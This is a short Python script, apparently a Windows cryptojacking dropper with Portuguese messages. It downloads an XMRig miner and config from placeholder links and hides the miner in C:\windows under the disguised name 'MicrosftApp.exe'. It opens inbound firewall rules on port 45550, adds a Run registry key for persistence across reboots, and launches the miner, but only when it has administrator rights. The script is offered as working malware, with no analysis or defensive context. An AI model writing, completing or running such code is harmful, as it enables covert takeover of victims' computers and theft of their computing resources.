# -*- coding: utf-8 -*-
import platform
import multiprocessing
import os
import subprocess
import sys
import wget
import winshell
import ctypes

def exe_64():
    dll = 'link here json'
    exe = 'link here Xmrig'
    filename = wget.download(dll)
    filename = wget.download(exe)
    os.popen("move /Y config.json C:\windows\config.json")
    os.popen("move /Y MicrosftApp.exe C:\windows\MicrosftApp.exe")
    try:
        os.popen(r'netsh.exe advfirewall firewall add rule name="WindowsStatus" protocol=TCP dir=in localport=45550 action=allow')
        os.popen(r'netsh.exe advfirewall firewall add rule name="WindowsStatus" protocol=UDP dir=in localport=45550 action=allow')
        print("Adicionado no firewall")
    except:
        pass #nao funciona
    os.popen(r'reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "MicrosftApp" /t REG_SZ /d C:\windows\MicrosftApp.exe /f')
    os.popen(r"C:\windows\MicrosftApp.exe")

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

if isAdmin():
    exe_64()
else:
    print("Execute como administrador")
    exit









